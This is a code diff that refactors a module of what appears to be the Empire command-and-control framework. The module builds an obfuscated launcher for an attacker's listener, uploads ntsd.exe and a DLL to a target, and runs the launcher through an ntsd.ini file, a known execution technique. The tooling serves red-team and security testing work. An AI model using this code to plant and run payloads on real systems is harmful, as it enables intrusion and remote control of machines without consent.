@@ -51,53 +51,52 @@ class Module:
         script_end = ""
         if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
             # not a valid listener, return nothing for the script
-            return handle_error_message("[!] Invalid listener: %s" % (listener_name))
-        else:
-            multi_launcher = main_menu.stagertemplatesv2.new_instance("multi_launcher")
-            multi_launcher.options["Listener"] = params["Listener"]
-            multi_launcher.options["UserAgent"] = params["UserAgent"]
-            multi_launcher.options["Proxy"] = params["Proxy"]
-            multi_launcher.options["ProxyCreds"] = params["ProxyCreds"]
-            multi_launcher.options["Obfuscate"] = params["Obfuscate"]
-            multi_launcher.options["ObfuscateCommand"] = params["ObfuscateCommand"]
-            multi_launcher.options["Bypasses"] = params["Bypasses"]
-            launcher = multi_launcher.generate()
+            return handle_error_message(f"[!] Invalid listener: {listener_name}")
 
-            if launcher == "":
-                return handle_error_message("[!] Error in launcher generation.")
-            else:
-                launcher = launcher.split(" ")[-1]
+        multi_launcher = main_menu.stagertemplatesv2.new_instance("multi_launcher")
+        multi_launcher.options["Listener"] = params["Listener"]
+        multi_launcher.options["UserAgent"] = params["UserAgent"]
+        multi_launcher.options["Proxy"] = params["Proxy"]
+        multi_launcher.options["ProxyCreds"] = params["ProxyCreds"]
+        multi_launcher.options["Obfuscate"] = params["Obfuscate"]
+        multi_launcher.options["ObfuscateCommand"] = params["ObfuscateCommand"]
+        multi_launcher.options["Bypasses"] = params["Bypasses"]
+        launcher = multi_launcher.generate()
 
-                with open(ntsd_exe, "rb") as bin_data:
-                    ntsd_exe_data = bin_data.read()
+        if launcher == "":
+            return handle_error_message("[!] Error in launcher generation.")
 
-                with open(ntsd_dll, "rb") as bin_data:
-                    ntsd_dll_data = bin_data.read()
+        launcher = launcher.split(" ")[-1]
 
-                exec_write = f'Write-Ini {upload_path} "{launcher}"'
-                code_exec = f"{upload_path}\\ntsd.exe -cf {upload_path}\\ntsd.ini {bin}"
-                ntsd_exe_upload = main_menu.stagers.generate_upload(
-                    ntsd_exe_data, ntsd_exe_upload_path
-                )
-                ntsd_dll_upload = main_menu.stagers.generate_upload(
-                    ntsd_dll_data, ntsd_dll_upload_path
-                )
+        with open(ntsd_exe, "rb") as bin_data:
+            ntsd_exe_data = bin_data.read()
 
-                script_end += "\r\n"
-                script_end += ntsd_exe_upload
-                script_end += ntsd_dll_upload
-                script_end += "\r\n"
-                script_end += exec_write
-                script_end += "\r\n"
-                # this is to make sure everything was uploaded properly
-                script_end += "Start-Sleep -s 5"
-                script_end += "\r\n"
-                script_end += code_exec
+        with open(ntsd_dll, "rb") as bin_data:
+            ntsd_dll_data = bin_data.read()
 
-        script = main_menu.modulesv2.finalize_module(
+        exec_write = f'Write-Ini {upload_path} "{launcher}"'
+        code_exec = f"{upload_path}\\ntsd.exe -cf {upload_path}\\ntsd.ini {bin}"
+        ntsd_exe_upload = main_menu.stagers.generate_upload(
+            ntsd_exe_data, ntsd_exe_upload_path
+        )
+        ntsd_dll_upload = main_menu.stagers.generate_upload(
+            ntsd_dll_data, ntsd_dll_upload_path
+        )
+
+        script_end += "\r\n"
+        script_end += ntsd_exe_upload
+        script_end += ntsd_dll_upload
+        script_end += "\r\n"
+        script_end += exec_write
+        script_end += "\r\n"
+        # this is to make sure everything was uploaded properly
+        script_end += "Start-Sleep -s 5"
+        script_end += "\r\n"
+        script_end += code_exec
+
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
